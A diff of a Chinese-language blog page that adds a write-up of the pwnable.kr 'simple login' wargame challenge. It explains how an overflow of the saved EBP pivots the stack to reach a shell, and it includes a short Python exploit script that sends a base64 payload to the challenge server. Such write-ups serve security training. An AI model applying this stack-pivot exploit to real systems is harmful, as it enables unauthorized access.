@@ -84,16 +84,28 @@
 
 
 
-<meta name="description" content="Dive dive dive into Binary">
-<meta property="og:type" content="website">
-<meta property="og:title" content="about">
-<meta property="og:url" content="http://0byjwzsf.me/about/index.html">
+<meta name="description" content="Trick
+输入payload后可以直接通过gdb的searchmem工具查找输入的字符串存放在内存的位置
+
+Conclusion解码后的字符串最大可以为12字节，容易发现最后4字节可以覆盖存放在栈上的EBP，这样就可以通过控制EBP的值来转移ESP到数据段上的payload处，之后的ret指令会跳转到payload上的地址，即我们已经构造好的correct函数的地址，从而拿到shell
+Expl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.kr-rookiss-simple-login">
+<meta property="og:url" content="http://0byjwzsf.me/2016/07/26/pwnable-rookiss-simple-login/index.html">
 <meta property="og:site_name" content="Icemakr's Blog">
-<meta property="og:description" content="Dive dive dive into Binary">
-<meta property="og:updated_time" content="2016-05-25T10:52:57.000Z">
+<meta property="og:description" content="Trick
+输入payload后可以直接通过gdb的searchmem工具查找输入的字符串存放在内存的位置
+
+Conclusion解码后的字符串最大可以为12字节，容易发现最后4字节可以覆盖存放在栈上的EBP，这样就可以通过控制EBP的值来转移ESP到数据段上的payload处，之后的ret指令会跳转到payload上的地址，即我们已经构造好的correct函数的地址，从而拿到shell
+Expl">
+<meta property="og:updated_time" content="2016-08-04T17:18:58.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="about">
-<meta name="twitter:description" content="Dive dive dive into Binary">
+<meta name="twitter:title" content="pwnable.kr-rookiss-simple-login">
+<meta name="twitter:description" content="Trick
+输入payload后可以直接通过gdb的searchmem工具查找输入的字符串存放在内存的位置
+
+Conclusion解码后的字符串最大可以为12字节，容易发现最后4字节可以覆盖存放在栈上的EBP，这样就可以通过控制EBP的值来转移ESP到数据段上的payload处，之后的ret指令会跳转到payload上的地址，即我们已经构造好的correct函数的地址，从而拿到shell
+Expl">
 
 
 
@@ -114,15 +126,9 @@
 
 
 
-  <link rel="canonical" href="http://0byjwzsf.me/about/"/>
+  <link rel="canonical" href="http://0byjwzsf.me/2016/07/26/pwnable-rookiss-simple-login/"/>
 
-  <title>
-  
-
-  
-    about | Icemakr's Blog
-  
-</title>
+  <title> pwnable.kr-rookiss-simple-login | Icemakr's Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -153,7 +159,7 @@
     
   
 
-  <div class="container one-collumn sidebar-position-left  ">
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -263,9 +269,147 @@
 
   <div id="posts" class="posts-expand">
     
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
     
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                pwnable.kr-rookiss-simple-login
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-07-26T00:00:00+08:00" content="2016-07-26">
+              2016-07-26
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/Wargames/" itemprop="url" rel="index">
+                    <span itemprop="name">Wargames</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/07/26/pwnable-rookiss-simple-login/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/07/26/pwnable-rookiss-simple-login/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
       
-    
+      
+
+      
+        <h2 id="Trick">Trick</h2><ul>
+<li>输入payload后可以直接通过gdb的<code>searchmem</code>工具查找输入的字符串存放在内存的位置</li>
+</ul>
+<h2 id="Conclusion">Conclusion</h2><p>解码后的字符串最大可以为12字节，容易发现最后4字节可以覆盖存放在栈上的<code>EBP</code>，这样就可以通过控制<code>EBP</code>的值来转移<code>ESP</code>到数据段上的payload处，之后的<code>ret</code>指令会跳转到payload上的地址，即我们已经构造好的<code>correct</code>函数的地址，从而拿到shell</p>
+<h2 id="Exploit">Exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = (<span class="string">'pwnable.kr'</span>, <span class="number">9003</span>)</span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">payload =   <span class="string">'AAAA'</span></span><br><span class="line">payload +=  l32(<span class="number">0x08049284</span>)</span><br><span class="line">payload +=  l32(<span class="number">0x0811eb40</span>)  </span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">'Authenticate :'</span>)</span><br><span class="line">io.writeline(b64encode(payload))</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/07/26/pwnable-rookiss-fsb/" rel="next" title="pwnable.kr-rookiss-fsb">
+                <i class="fa fa-chevron-left"></i> pwnable.kr-rookiss-fsb
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/07/27/pwnable-rookiss-tiny-easy/" rel="prev" title="pwnable.kr-rookiss-tiny-easy">
+                pwnable.kr-rookiss-tiny-easy <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
   </div>
 
 
@@ -274,6 +418,17 @@
 
 
           
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
 
         </div>
         
@@ -293,8 +448,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel  sidebar-panel-active ">
+      <section class="site-overview sidebar-panel ">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/images/author.jpg"
@@ -348,6 +512,17 @@
 
       </section>
 
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Trick"><span class="nav-number">1.</span> <span class="nav-text">Trick</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Conclusion"><span class="nav-number">2.</span> <span class="nav-text">Conclusion</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">3.</span> <span class="nav-text">Exploit</span></a></li></ol></div>
+            
+          </div>
+        </section>
       
 
     </div>
@@ -451,6 +626,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
 
   
 
@@ -467,9 +646,9 @@
 
     <script type="text/javascript">
       var disqus_shortname = '0byjwzsf';
-      var disqus_identifier = 'about/index.html';
-      var disqus_title = "about";
-      var disqus_url = 'http://0byjwzsf.me/about/index.html';
+      var disqus_identifier = '2016/07/26/pwnable-rookiss-simple-login/';
+      var disqus_title = "pwnable.kr-rookiss-simple-login";
+      var disqus_url = 'http://0byjwzsf.me/2016/07/26/pwnable-rookiss-simple-login/';
 
       function run_disqus_script(disqus_script){
         var dsq = document.createElement('script');
@@ -480,6 +659,8 @@
       }
 
       run_disqus_script('count.js');
+      
+        run_disqus_script('embed.js');
       
     </script>
   
